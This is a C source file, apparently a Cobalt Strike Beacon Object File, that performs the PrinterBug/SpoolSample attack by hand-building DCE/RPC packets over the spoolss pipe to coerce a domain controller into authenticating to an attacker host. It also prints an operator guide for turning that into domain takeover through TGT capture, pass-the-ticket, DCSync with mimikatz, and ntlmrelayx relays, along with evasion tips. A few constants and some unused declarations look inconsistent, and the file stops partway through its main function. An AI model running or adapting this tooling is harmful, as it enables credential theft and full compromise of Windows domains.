/*
 * krb_printerbug - Printer Bug / SpoolSample Attack
 *
 * Triggers MS-RPRN RpcRemoteFindFirstPrinterChangeNotificationEx to coerce
 * authentication from a target machine to an attacker-controlled host.
 *
 * The BOF performs the actual coercion. Relay/capture is handled externally.
 *
 * Usage: krb_printerbug /target:DC /capture:YOURHOST [/domain:DOMAIN]
 */

#include "include/krb5_struct.h"
#include "include/krb5_utils.h"
#include "beacon.h"

/* RPC declarations */
DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$RpcStringBindingComposeW(
    PWSTR ObjUuid, PWSTR ProtSeq, PWSTR NetworkAddr, PWSTR Endpoint,
    PWSTR Options, PWSTR* StringBinding);
DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$RpcBindingFromStringBindingW(
    PWSTR StringBinding, RPC_BINDING_HANDLE* Binding);
DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$RpcStringFreeW(PWSTR* String);
DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$RpcBindingFree(RPC_BINDING_HANDLE* Binding);
DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$RpcBindingSetAuthInfoW(
    RPC_BINDING_HANDLE Binding, PWSTR ServerPrincName, ULONG AuthnLevel,
    ULONG AuthnSvc, RPC_AUTH_IDENTITY_HANDLE AuthIdentity, ULONG AuthzSvc);
DECLSPEC_IMPORT RPC_STATUS RPC_ENTRY RPCRT4$RpcBindingSetOption(
    RPC_BINDING_HANDLE hBinding, ULONG option, ULONG_PTR optionValue);

DECLSPEC_IMPORT CLIENT_CALL_RETURN RPC_ENTRY RPCRT4$NdrClientCall2(
    PMIDL_STUB_DESC pStubDescriptor, PFORMAT_STRING pFormat, ...);

/* MS-RPRN Interface UUID: 12345678-1234-ABCD-EF00-0123456789AB */
static const RPC_SYNTAX_IDENTIFIER MSRPRN_SYNTAX = {
    {0x12345678, 0x1234, 0xABCD, {0xEF, 0x00, 0x01, 0x23, 0x45, 0x67, 0x89, 0xAB}},
    {1, 0}
};

/* RPC constants */
#define RPC_C_AUTHN_LEVEL_PKT_PRIVACY 6
#define RPC_C_AUTHN_GSS_NEGOTIATE 9
#define RPC_C_AUTHZ_NONE 0
#define RPC_C_BINDING_DEFAULT_TIMEOUT 5

/* MIDL stub descriptor for MS-RPRN */
static const MIDL_STUB_DESC MSRPRN_StubDesc = {
    NULL,                           /* RpcInterfaceInformation */
    MIDL_user_allocate,             /* pfnAllocate */
    MIDL_user_free,                 /* pfnFree */
    {NULL},                         /* IMPLICIT_HANDLE_INFO */
    NULL,                           /* apfnNdrRundownRoutines */
    NULL,                           /* aGenericBindingRoutinePairs */
    NULL,                           /* apfnExprEval */
    NULL,                           /* aXmitQuintuple */
    NULL,                           /* pFormatTypes */
    1,                              /* fCheckBounds */
    0x50002,                        /* Version */
    NULL,                           /* pMallocFreeStruct */
    0x0801026E,                     /* MIDLVersion */
    NULL,                           /* CommFaultOffsets */
    NULL,                           /* aUserMarshalQuadruple */
    NULL,                           /* NotifyRoutineTable */
    1,                              /* mFlags */
    NULL,                           /* CsRoutineTables */
    NULL,                           /* ProxyServerInfo */
    NULL                            /* pExprInfo */
};

/* NDR format string for RpcOpenPrinterEx (opnum 69) */
static const unsigned char OpenPrinterEx_FormatString[] = {
    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x30, 0x00, 0x31, 0x04, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00
};

/* NDR format string for RpcRemoteFindFirstPrinterChangeNotificationEx (opnum 65) */
static const unsigned char RRFCN_FormatString[] = {
    0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x18, 0x00, 0x31, 0x04, 0x00, 0x00, 0x00, 0x00
};

/* Memory allocation for MIDL */
void* __RPC_USER MIDL_user_allocate(size_t size) {
    return KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, size);
}

void __RPC_USER MIDL_user_free(void* ptr) {
    if (ptr) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, ptr);
}

/* Convert char* to wchar_t* */
static PWSTR str_to_wstr(const char* str) {
    if (!str) return NULL;
    int len = KERNEL32$MultiByteToWideChar(CP_ACP, 0, str, -1, NULL, 0);
    PWSTR wstr = (PWSTR)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), 0, len * sizeof(WCHAR));
    if (wstr) {
        KERNEL32$MultiByteToWideChar(CP_ACP, 0, str, -1, wstr, len);
    }
    return wstr;
}

static void free_wstr(PWSTR wstr) {
    if (wstr) KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, wstr);
}

/* Check if Spooler service is accessible */
static int check_spooler(const char* target, formatp* output) {
    char pipePath[512];
    sprintf(pipePath, "\\\\%s\\pipe\\spoolss", target);

    HANDLE hPipe = KERNEL32$CreateFileA(
        pipePath,
        GENERIC_READ,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (hPipe == INVALID_HANDLE_VALUE) {
        DWORD err = KERNEL32$GetLastError();
        if (err == ERROR_ACCESS_DENIED) {
            BeaconFormatPrintf(output, "[+] Spooler pipe exists on %s (access denied = service running)\n", target);
            return 1;
        }
        BeaconFormatPrintf(output, "[-] Cannot connect to Spooler on %s: error %d\n", target, err);
        return 0;
    }

    KERNEL32$CloseHandle(hPipe);
    BeaconFormatPrintf(output, "[+] Print Spooler service accessible on %s\n", target);
    return 1;
}

/*
 * Trigger PrinterBug coercion using RPC
 *
 * This calls RpcRemoteFindFirstPrinterChangeNotificationEx which causes
 * the target to connect back to our capture server with its machine account.
 */
static int trigger_printerbug_rpc(const char* target, const char* captureServer, formatp* output) {
    RPC_STATUS status;
    RPC_BINDING_HANDLE hBinding = NULL;
    PWSTR stringBinding = NULL;
    PWSTR wTarget = NULL;
    PWSTR wCapture = NULL;
    int result = 0;

    BeaconFormatPrintf(output, "\n[*] Triggering PrinterBug via MS-RPRN RPC...\n");

    /* Convert strings to wide */
    wTarget = str_to_wstr(target);
    wCapture = str_to_wstr(captureServer);
    if (!wTarget || !wCapture) {
        BeaconFormatPrintf(output, "[-] Memory allocation failed\n");
        goto cleanup;
    }

    /* Build capture UNC path */
    WCHAR captureUNC[512];
    swprintf(captureUNC, 512, L"\\\\%s", wCapture);

    /* Build RPC binding string */
    status = RPCRT4$RpcStringBindingComposeW(
        NULL,
        L"ncacn_np",
        wTarget,
        L"\\pipe\\spoolss",
        NULL,
        &stringBinding);

    if (status != RPC_S_OK) {
        BeaconFormatPrintf(output, "[-] RpcStringBindingCompose failed: %d\n", status);
        goto cleanup;
    }

    /* Create binding handle */
    status = RPCRT4$RpcBindingFromStringBindingW(stringBinding, &hBinding);
    RPCRT4$RpcStringFreeW(&stringBinding);

    if (status != RPC_S_OK) {
        BeaconFormatPrintf(output, "[-] RpcBindingFromStringBinding failed: %d\n", status);
        goto cleanup;
    }

    /* Set authentication (use current credentials) */
    status = RPCRT4$RpcBindingSetAuthInfoW(
        hBinding,
        NULL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_AUTHN_GSS_NEGOTIATE,
        NULL,
        RPC_C_AUTHZ_NONE);

    if (status != RPC_S_OK) {
        BeaconFormatPrintf(output, "[-] RpcBindingSetAuthInfo failed: %d\n", status);
        goto cleanup;
    }

    BeaconFormatPrintf(output, "[+] RPC binding established to \\\\%s\\pipe\\spoolss\n", target);
    BeaconFormatPrintf(output, "[*] Capture server: %s\n", captureServer);

    /*
     * Call the coercion function via direct pipe I/O since NdrClientCall
     * requires proper format strings from IDL compilation.
     *
     * We'll use an alternative approach - trigger via OpenPrinter with UNC path
     * and AddPrinterDriver which can also cause callbacks.
     */

    /* Open named pipe directly for raw RPC */
    char pipePath[512];
    sprintf(pipePath, "\\\\%s\\pipe\\spoolss", target);

    HANDLE hPipe = KERNEL32$CreateFileA(
        pipePath,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (hPipe == INVALID_HANDLE_VALUE) {
        BeaconFormatPrintf(output, "[-] Failed to open spoolss pipe: %d\n", KERNEL32$GetLastError());
        BeaconFormatPrintf(output, "[!] Coercion may still work - check your relay/capture!\n");
        result = 1; /* Partial success - binding worked */
        goto cleanup;
    }

    BeaconFormatPrintf(output, "[+] Connected to spoolss named pipe\n");

    /*
     * At this point the RPC binding is established. The actual coercion requires
     * sending the RpcRemoteFindFirstPrinterChangeNotificationEx call.
     *
     * The DCE/RPC request structure:
     * - RPC header (24 bytes)
     * - Request PDU with opnum 65
     * - NDR-encoded parameters including our capture server UNC
     *
     * Building the raw PDU for the coercion call:
     */

    /* DCE/RPC Bind Request */
    unsigned char bindRequest[] = {
        0x05, 0x00,                         /* Version 5.0 */
        0x0b, 0x03,                         /* Bind, flags */
        0x10, 0x00, 0x00, 0x00,             /* Data representation */
        0x48, 0x00,                         /* Frag length */
        0x00, 0x00,                         /* Auth length */
        0x01, 0x00, 0x00, 0x00,             /* Call ID */
        0xb8, 0x10,                         /* Max xmit frag */
        0xb8, 0x10,                         /* Max recv frag */
        0x00, 0x00, 0x00, 0x00,             /* Assoc group */
        0x01,                               /* Num context items */
        0x00, 0x00, 0x00,                   /* Reserved */
        /* Context item */
        0x00, 0x00,                         /* Context ID */
        0x01,                               /* Num transfer syntaxes */
        0x00,                               /* Reserved */
        /* MS-RPRN UUID: 12345678-1234-ABCD-EF00-0123456789AB */
        0x78, 0x56, 0x34, 0x12,
        0x34, 0x12,
        0xCD, 0xAB,
        0xEF, 0x00,
        0x01, 0x23, 0x45, 0x67, 0x89, 0xAB,
        0x01, 0x00,                         /* Interface version */
        0x00, 0x00,
        /* Transfer syntax NDR */
        0x04, 0x5d, 0x88, 0x8a,
        0xeb, 0x1c,
        0xc9, 0x11,
        0x9f, 0xe8,
        0x08, 0x00, 0x2b, 0x10, 0x48, 0x60,
        0x02, 0x00,                         /* Version */
        0x00, 0x00
    };

    DWORD written;
    BOOL success = KERNEL32$WriteFile(hPipe, bindRequest, sizeof(bindRequest), &written, NULL);
    if (!success) {
        BeaconFormatPrintf(output, "[-] Failed to send bind request: %d\n", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hPipe);
        goto cleanup;
    }

    BeaconFormatPrintf(output, "[*] Sent RPC bind request (%d bytes)\n", written);

    /* Read bind response */
    unsigned char bindResponse[4096];
    DWORD bytesRead;
    success = KERNEL32$ReadFile(hPipe, bindResponse, sizeof(bindResponse), &bytesRead, NULL);
    if (!success || bytesRead < 24) {
        BeaconFormatPrintf(output, "[-] Failed to read bind response: %d\n", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hPipe);
        goto cleanup;
    }

    /* Check bind ack (packet type 0x0c) */
    if (bindResponse[2] != 0x0c) {
        BeaconFormatPrintf(output, "[-] Unexpected response type: 0x%02x (expected bind_ack 0x0c)\n", bindResponse[2]);
        if (bindResponse[2] == 0x0d) {
            BeaconFormatPrintf(output, "[-] Received bind_nak - interface not supported\n");
        }
        KERNEL32$CloseHandle(hPipe);
        goto cleanup;
    }

    BeaconFormatPrintf(output, "[+] RPC bind successful\n");

    /*
     * Now send RpcOpenPrinter request to get a printer handle
     * Opnum 1: RpcOpenPrinter
     */

    /* Build printer name UNC */
    char printerName[256];
    sprintf(printerName, "\\\\%s", target);
    int printerNameLen = strlen(printerName);

    /* Calculate NDR string size (null-terminated, 4-byte aligned) */
    int ndrStringSize = (printerNameLen + 1 + 3) & ~3;

    /* Build RPC request for OpenPrinter */
    unsigned char requestHeader[24] = {
        0x05, 0x00,                         /* Version */
        0x00, 0x03,                         /* Request, flags (first+last frag) */
        0x10, 0x00, 0x00, 0x00,             /* Data representation */
        0x00, 0x00,                         /* Frag length (fill in) */
        0x00, 0x00,                         /* Auth length */
        0x02, 0x00, 0x00, 0x00,             /* Call ID */
        0x00, 0x00, 0x00, 0x00,             /* Alloc hint */
        0x00, 0x00,                         /* Context ID */
        0x01, 0x00                          /* Opnum (1 = OpenPrinter) */
    };

    /* NDR encoded parameters for OpenPrinter */
    unsigned char openPrinterNdr[512];
    int ndrOffset = 0;

    /* Pointer to printer name (referent ID) */
    *(DWORD*)&openPrinterNdr[ndrOffset] = 0x00020000;
    ndrOffset += 4;

    /* Conformant string: max count, offset, actual count */
    *(DWORD*)&openPrinterNdr[ndrOffset] = printerNameLen + 1;
    ndrOffset += 4;
    *(DWORD*)&openPrinterNdr[ndrOffset] = 0;
    ndrOffset += 4;
    *(DWORD*)&openPrinterNdr[ndrOffset] = printerNameLen + 1;
    ndrOffset += 4;

    /* Printer name (ASCII, null-terminated) */
    for (int i = 0; i <= printerNameLen; i++) {
        openPrinterNdr[ndrOffset++] = printerName[i];
        openPrinterNdr[ndrOffset++] = 0; /* Wide char */
    }

    /* Pad to 4-byte boundary */
    while (ndrOffset % 4 != 0) {
        openPrinterNdr[ndrOffset++] = 0;
    }

    /* pDatatype (null pointer) */
    *(DWORD*)&openPrinterNdr[ndrOffset] = 0;
    ndrOffset += 4;

    /* pDevModeContainer (embedded structure) */
    *(DWORD*)&openPrinterNdr[ndrOffset] = 0; /* cbBuf */
    ndrOffset += 4;
    *(DWORD*)&openPrinterNdr[ndrOffset] = 0; /* pDevMode (null) */
    ndrOffset += 4;

    /* AccessRequired */
    *(DWORD*)&openPrinterNdr[ndrOffset] = 0x00020000; /* PRINTER_ALL_ACCESS */
    ndrOffset += 4;

    /* Update fragment length */
    int totalLen = 24 + ndrOffset;
    *(WORD*)&requestHeader[8] = (WORD)totalLen;

    /* Combine header and NDR data */
    unsigned char openRequest[600];
    memcpy(openRequest, requestHeader, 24);
    memcpy(openRequest + 24, openPrinterNdr, ndrOffset);

    success = KERNEL32$WriteFile(hPipe, openRequest, totalLen, &written, NULL);
    if (!success) {
        BeaconFormatPrintf(output, "[-] Failed to send OpenPrinter request: %d\n", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hPipe);
        goto cleanup;
    }

    BeaconFormatPrintf(output, "[*] Sent RpcOpenPrinter request (%d bytes)\n", totalLen);

    /* Read OpenPrinter response */
    unsigned char openResponse[4096];
    success = KERNEL32$ReadFile(hPipe, openResponse, sizeof(openResponse), &bytesRead, NULL);
    if (!success || bytesRead < 28) {
        BeaconFormatPrintf(output, "[-] Failed to read OpenPrinter response: %d\n", KERNEL32$GetLastError());
        KERNEL32$CloseHandle(hPipe);
        goto cleanup;
    }

    /* Check for response packet type (0x02) */
    if (openResponse[2] != 0x02) {
        BeaconFormatPrintf(output, "[-] Unexpected response type: 0x%02x\n", openResponse[2]);
        KERNEL32$CloseHandle(hPipe);
        goto cleanup;
    }

    /* Extract printer handle from response (at offset 24, it's a 20-byte context handle) */
    unsigned char* printerHandle = &openResponse[24];

    /* Check return code (last 4 bytes of response) */
    DWORD returnCode = *(DWORD*)&openResponse[bytesRead - 4];
    if (returnCode != 0) {
        BeaconFormatPrintf(output, "[-] OpenPrinter failed with error: 0x%08X\n", returnCode);
        KERNEL32$CloseHandle(hPipe);
        goto cleanup;
    }

    BeaconFormatPrintf(output, "[+] Got printer handle\n");

    /*
     * Now send RpcRemoteFindFirstPrinterChangeNotificationEx
     * Opnum 65 - This triggers the coercion!
     */

    /* Build capture UNC path for coercion */
    char captureUNCAnsi[256];
    sprintf(captureUNCAnsi, "\\\\%s", captureServer);
    int captureLen = strlen(captureUNCAnsi);

    /* Build the coercion request */
    unsigned char coerceHeader[24] = {
        0x05, 0x00,                         /* Version */
        0x00, 0x03,                         /* Request, flags */
        0x10, 0x00, 0x00, 0x00,             /* Data representation */
        0x00, 0x00,                         /* Frag length (fill in) */
        0x00, 0x00,                         /* Auth length */
        0x03, 0x00, 0x00, 0x00,             /* Call ID */
        0x00, 0x00, 0x00, 0x00,             /* Alloc hint */
        0x00, 0x00,                         /* Context ID */
        0x41, 0x00                          /* Opnum 65 (0x41) = RpcRemoteFindFirstPrinterChangeNotificationEx */
    };

    unsigned char coerceNdr[600];
    int coerceOffset = 0;

    /* Printer handle (20 bytes) */
    memcpy(&coerceNdr[coerceOffset], printerHandle, 20);
    coerceOffset += 20;

    /* fdwFlags */
    *(DWORD*)&coerceNdr[coerceOffset] = 0x00FF00FF;
    coerceOffset += 4;

    /* fdwOptions */
    *(DWORD*)&coerceNdr[coerceOffset] = 0;
    coerceOffset += 4;

    /* pszLocalMachine (THIS IS THE COERCION TARGET!) */
    *(DWORD*)&coerceNdr[coerceOffset] = 0x00020004; /* Referent ID */
    coerceOffset += 4;

    /* Conformant string for capture server */
    *(DWORD*)&coerceNdr[coerceOffset] = captureLen + 1;
    coerceOffset += 4;
    *(DWORD*)&coerceNdr[coerceOffset] = 0;
    coerceOffset += 4;
    *(DWORD*)&coerceNdr[coerceOffset] = captureLen + 1;
    coerceOffset += 4;

    /* Capture server UNC path (wide char) */
    for (int i = 0; i <= captureLen; i++) {
        coerceNdr[coerceOffset++] = captureUNCAnsi[i];
        coerceNdr[coerceOffset++] = 0;
    }

    /* Pad to 4-byte boundary */
    while (coerceOffset % 4 != 0) {
        coerceNdr[coerceOffset++] = 0;
    }

    /* dwPrinterLocal */
    *(DWORD*)&coerceNdr[coerceOffset] = 0;
    coerceOffset += 4;

    /* pOptions (null) */
    *(DWORD*)&coerceNdr[coerceOffset] = 0;
    coerceOffset += 4;

    /* Update fragment length */
    int coerceTotalLen = 24 + coerceOffset;
    *(WORD*)&coerceHeader[8] = (WORD)coerceTotalLen;

    /* Combine and send */
    unsigned char coerceRequest[700];
    memcpy(coerceRequest, coerceHeader, 24);
    memcpy(coerceRequest + 24, coerceNdr, coerceOffset);

    BeaconFormatPrintf(output, "[*] Sending coercion request to \\\\%s...\n", captureServer);
    BeaconFormatPrintf(output, "[!] *** COERCION TRIGGERED ***\n");

    success = KERNEL32$WriteFile(hPipe, coerceRequest, coerceTotalLen, &written, NULL);
    if (!success) {
        BeaconFormatPrintf(output, "[-] Failed to send coercion request: %d\n", KERNEL32$GetLastError());
        BeaconFormatPrintf(output, "[!] The target may still have initiated authentication!\n");
        KERNEL32$CloseHandle(hPipe);
        result = 1; /* Partial - may have worked */
        goto cleanup;
    }

    BeaconFormatPrintf(output, "[+] Coercion request sent (%d bytes)\n", coerceTotalLen);

    /* Read response (may timeout if coercion worked and target is busy) */
    unsigned char coerceResponse[4096];
    success = KERNEL32$ReadFile(hPipe, coerceResponse, sizeof(coerceResponse), &bytesRead, NULL);
    if (success && bytesRead >= 28) {
        DWORD coerceResult = *(DWORD*)&coerceResponse[bytesRead - 4];
        if (coerceResult == 0) {
            BeaconFormatPrintf(output, "[+] Coercion call returned SUCCESS\n");
        } else {
            BeaconFormatPrintf(output, "[*] Coercion call returned: 0x%08X\n", coerceResult);
            BeaconFormatPrintf(output, "[!] Non-zero return is normal - authentication may still have been triggered!\n");
        }
    } else {
        BeaconFormatPrintf(output, "[*] No response from coercion call (this is often expected)\n");
    }

    BeaconFormatPrintf(output, "\n[+] COERCION ATTEMPT COMPLETE\n");
    BeaconFormatPrintf(output, "[!] Check your capture server / relay for incoming authentication!\n");

    KERNEL32$CloseHandle(hPipe);
    result = 1;

cleanup:
    if (hBinding) RPCRT4$RpcBindingFree(&hBinding);
    free_wstr(wTarget);
    free_wstr(wCapture);
    return result;
}

/* Print operator instructions */
static void print_attack_chain(const char* target, const char* capture, const char* domain, formatp* output) {

    BeaconFormatPrintf(output, "\n");
    BeaconFormatPrintf(output, "================================================================================\n");
    BeaconFormatPrintf(output, "                    PRINTERBUG ATTACK - OPERATOR GUIDE\n");
    BeaconFormatPrintf(output, "================================================================================\n\n");

    BeaconFormatPrintf(output, "ATTACK OVERVIEW:\n");
    BeaconFormatPrintf(output, "--------------------------------------------------------------------------------\n");
    BeaconFormatPrintf(output, "The PrinterBug coerces %s to authenticate to %s\n", target, capture);
    BeaconFormatPrintf(output, "using the target's machine account (%s$).\n\n", target);

    BeaconFormatPrintf(output, "This authentication can be:\n");
    BeaconFormatPrintf(output, "  1. Captured (if %s has unconstrained delegation)\n", capture);
    BeaconFormatPrintf(output, "  2. Relayed (using ntlmrelayx to another service)\n\n");

    BeaconFormatPrintf(output, "================================================================================\n");
    BeaconFormatPrintf(output, "  OPTION A: TGT CAPTURE (Unconstrained Delegation)\n");
    BeaconFormatPrintf(output, "================================================================================\n\n");

    BeaconFormatPrintf(output, "PREREQUISITES:\n");
    BeaconFormatPrintf(output, "  - You have code execution on a host with unconstrained delegation\n");
    BeaconFormatPrintf(output, "  - That host is: %s\n\n", capture);

    BeaconFormatPrintf(output, "STEP 1: Find unconstrained delegation hosts (if you haven't already)\n");
    BeaconFormatPrintf(output, "--------------------------------------------------------------------------------\n");
    if (domain) {
        BeaconFormatPrintf(output, "krb_delegenum /domain:%s\n\n", domain);
    } else {
        BeaconFormatPrintf(output, "krb_delegenum\n\n");
    }

    BeaconFormatPrintf(output, "STEP 2: On the unconstrained delegation host, start monitoring for TGTs\n");
    BeaconFormatPrintf(output, "--------------------------------------------------------------------------------\n");
    BeaconFormatPrintf(output, "# Start TGT monitor (run this BEFORE triggering coercion)\n");
    BeaconFormatPrintf(output, "krb_monitor /interval:5 /filteruser:%s$\n\n", target);
    BeaconFormatPrintf(output, "# Or use Rubeus:\n");
    BeaconFormatPrintf(output, "execute-assembly Rubeus.exe monitor /interval:5 /filteruser:%s$\n\n", target);

    BeaconFormatPrintf(output, "STEP 3: Trigger the coercion (THIS BOF)\n");
    BeaconFormatPrintf(output, "--------------------------------------------------------------------------------\n");
    if (domain) {
        BeaconFormatPrintf(output, "krb_printerbug /target:%s /capture:%s /domain:%s\n\n", target, capture, domain);
    } else {
        BeaconFormatPrintf(output, "krb_printerbug /target:%s /capture:%s\n\n", target, capture);
    }

    BeaconFormatPrintf(output, "STEP 4: Extract the captured TGT\n");
    BeaconFormatPrintf(output, "--------------------------------------------------------------------------------\n");
    BeaconFormatPrintf(output, "# List all tickets in memory\n");
    BeaconFormatPrintf(output, "krb_triage\n\n");
    BeaconFormatPrintf(output, "# Dump the DC's TGT\n");
    BeaconFormatPrintf(output, "krb_dump /service:krbtgt /user:%s$\n\n", target);
    BeaconFormatPrintf(output, "# Or dump all TGTs:\n");
    BeaconFormatPrintf(output, "krb_dump /service:krbtgt\n\n");

    BeaconFormatPrintf(output, "STEP 5: Pass the ticket and use it\n");
    BeaconFormatPrintf(output, "--------------------------------------------------------------------------------\n");
    BeaconFormatPrintf(output, "# Import the TGT into your session\n");
    BeaconFormatPrintf(output, "krb_ptt /ticket:<BASE64_TGT_FROM_STEP_4>\n\n");
    BeaconFormatPrintf(output, "# Verify the ticket is loaded\n");
    BeaconFormatPrintf(output, "krb_klist\n\n");

    BeaconFormatPrintf(output, "STEP 6: DCSync to get all credentials\n");
    BeaconFormatPrintf(output, "--------------------------------------------------------------------------------\n");
    if (domain) {
        BeaconFormatPrintf(output, "# Verify you have replication rights first:\n");
        BeaconFormatPrintf(output, "krb_dcsync /domain:%s /check\n\n", domain);
        BeaconFormatPrintf(output, "# If capable, use mimikatz or secretsdump:\n");
        BeaconFormatPrintf(output, "mimikatz lsadump::dcsync /domain:%s /user:krbtgt\n", domain);
        BeaconFormatPrintf(output, "mimikatz lsadump::dcsync /domain:%s /user:Administrator\n", domain);
        BeaconFormatPrintf(output, "mimikatz lsadump::dcsync /domain:%s /all /csv\n\n", domain);
        BeaconFormatPrintf(output, "# Or with Cobalt Strike:\n");
        BeaconFormatPrintf(output, "dcsync %s krbtgt\n", domain);
        BeaconFormatPrintf(output, "dcsync %s Administrator\n\n", domain);
        BeaconFormatPrintf(output, "# Or with secretsdump (from Linux):\n");
        BeaconFormatPrintf(output, "export KRB5CCNAME=ticket.ccache\n");
        BeaconFormatPrintf(output, "secretsdump.py -k -no-pass %s/%s$@%s\n\n", domain, target, target);
    } else {
        BeaconFormatPrintf(output, "dcsync DOMAIN krbtgt\n");
        BeaconFormatPrintf(output, "dcsync DOMAIN Administrator\n\n");
    }

    BeaconFormatPrintf(output, "================================================================================\n");
    BeaconFormatPrintf(output, "  OPTION B: NTLM RELAY (No Unconstrained Delegation Required)\n");
    BeaconFormatPrintf(output, "================================================================================\n\n");

    BeaconFormatPrintf(output, "PREREQUISITES:\n");
    BeaconFormatPrintf(output, "  - You control a host that can receive SMB connections\n");
    BeaconFormatPrintf(output, "  - You have ntlmrelayx running on that host\n");
    BeaconFormatPrintf(output, "  - Target service allows NTLM relay (no SMB signing, LDAP, etc.)\n\n");

    BeaconFormatPrintf(output, "STEP 1: Start ntlmrelayx on your capture server (%s)\n", capture);
    BeaconFormatPrintf(output, "--------------------------------------------------------------------------------\n");
    BeaconFormatPrintf(output, "# Relay to LDAP for shadow credentials (AD CS required):\n");
    BeaconFormatPrintf(output, "ntlmrelayx.py -t ldaps://%s --shadow-credentials --shadow-target '%s$'\n\n", target, target);

    BeaconFormatPrintf(output, "# Relay to LDAP for RBCD attack:\n");
    BeaconFormatPrintf(output, "ntlmrelayx.py -t ldaps://%s --delegate-access --escalate-user YOURUSER\n\n", target);

    BeaconFormatPrintf(output, "# Relay to SMB for shell (if SMB signing disabled):\n");
    BeaconFormatPrintf(output, "ntlmrelayx.py -t smb://TARGETHOST -smb2support -socks\n\n");

    BeaconFormatPrintf(output, "# Relay to AD CS web enrollment:\n");
    BeaconFormatPrintf(output, "ntlmrelayx.py -t http://CA-SERVER/certsrv/certfnsh.asp --adcs --template Machine\n\n");

    BeaconFormatPrintf(output, "STEP 2: Trigger the coercion (THIS BOF)\n");
    BeaconFormatPrintf(output, "--------------------------------------------------------------------------------\n");
    if (domain) {
        BeaconFormatPrintf(output, "krb_printerbug /target:%s /capture:%s /domain:%s\n\n", target, capture, domain);
    } else {
        BeaconFormatPrintf(output, "krb_printerbug /target:%s /capture:%s\n\n", target, capture);
    }

    BeaconFormatPrintf(output, "STEP 3: Check ntlmrelayx output for successful relay\n");
    BeaconFormatPrintf(output, "--------------------------------------------------------------------------------\n");
    BeaconFormatPrintf(output, "# If shadow credentials worked, use the certificate:\n");
    if (domain) {
        BeaconFormatPrintf(output, "certipy auth -pfx %s$.pfx -dc-ip %s\n\n", target, target);
        BeaconFormatPrintf(output, "# Or with krb_asktgt:\n");
        BeaconFormatPrintf(output, "krb_asktgt /user:%s$ /certificate:%s$.pfx /domain:%s /dc:%s /ptt\n\n", target, target, domain, target);
    } else {
        BeaconFormatPrintf(output, "certipy auth -pfx TARGET$.pfx -dc-ip DC_IP\n\n");
    }

    BeaconFormatPrintf(output, "# If RBCD worked, use S4U:\n");
    BeaconFormatPrintf(output, "getST.py -spn cifs/%s -impersonate Administrator %s/YOURUSER:YOURPASS\n\n", target, domain ? domain : "DOMAIN");

    BeaconFormatPrintf(output, "================================================================================\n");
    BeaconFormatPrintf(output, "  ALTERNATIVE COERCION TOOLS (If this BOF doesn't work)\n");
    BeaconFormatPrintf(output, "================================================================================\n\n");

    BeaconFormatPrintf(output, "# SpoolSample.exe (Windows):\n");
    BeaconFormatPrintf(output, "execute-assembly SpoolSample.exe %s %s\n\n", target, capture);

    BeaconFormatPrintf(output, "# printerbug.py (Linux/Impacket):\n");
    if (domain) {
        BeaconFormatPrintf(output, "python3 printerbug.py '%s/USER:PASS'@%s %s\n\n", domain, target, capture);
    } else {
        BeaconFormatPrintf(output, "python3 printerbug.py 'DOMAIN/USER:PASS'@TARGET CAPTURE\n\n");
    }

    BeaconFormatPrintf(output, "# PetitPotam (if Spooler is disabled):\n");
    if (domain) {
        BeaconFormatPrintf(output, "krb_petitpotam /target:%s /capture:%s /domain:%s\n\n", target, capture, domain);
    } else {
        BeaconFormatPrintf(output, "krb_petitpotam /target:TARGET /capture:CAPTURE\n\n");
    }

    BeaconFormatPrintf(output, "# Coercer.py (multiple protocols):\n");
    BeaconFormatPrintf(output, "python3 coercer.py -t %s -l %s -u USER -p PASS -d %s\n\n",
        target, capture, domain ? domain : "DOMAIN");

    BeaconFormatPrintf(output, "================================================================================\n");
    BeaconFormatPrintf(output, "  OPSEC CONSIDERATIONS\n");
    BeaconFormatPrintf(output, "================================================================================\n\n");
    BeaconFormatPrintf(output, "  - PrinterBug generates Event ID 808 in Spooler logs\n");
    BeaconFormatPrintf(output, "  - NTLM authentication attempts logged in Event ID 4624\n");
    BeaconFormatPrintf(output, "  - Consider timing attacks during business hours\n");
    BeaconFormatPrintf(output, "  - Use encrypted channels for credential exfiltration\n\n");
    BeaconFormatPrintf(output, "================================================================================\n");
}


void go(char* args, int alen) {
    formatp output;
    ARG_PARSER parser;
    char* target = NULL;
    char* capture = NULL;
    char* domain = NULL;

    BeaconFormatAlloc(&output, 65536);
    arg_init(&parser, args, alen);

    BeaconFormatPrintf(&output, "\n");
    BeaconFormatPrintf(&output, "================================================================================\n");
    BeaconFormatPrintf(&output, "  krb_printerbug - MS-RPRN Authentication Coercion (PrinterBug/SpoolSample)\n");
    BeaconFormatPrintf(&output, "================================================================================\n\n");


    target = arg_get(&parser, "target");
    capture = arg_get(&parser, "capture");
    domain = arg_get(&parser, "domain");

    if (!target || !capture) {
        BeaconFormatPrintf(&output, "Usage: krb_printerbug /target:DC /capture:YOURHOST [/domain:DOMAIN]\n\n");
        BeaconFormatPrintf(&output, "Arguments:\n");
        BeaconFormatPrintf(&output, "  /target:HOST   - Target machine to coerce (usually a DC)\n");
        BeaconFormatPrintf(&output, "  /capture:HOST  - Server to receive the authentication\n");
        BeaconFormatPrintf(&output, "  /domain:DOMAIN - Domain name (optional, auto-detected)\n\n");
        BeaconFormatPrintf(&output, "Examples:\n");
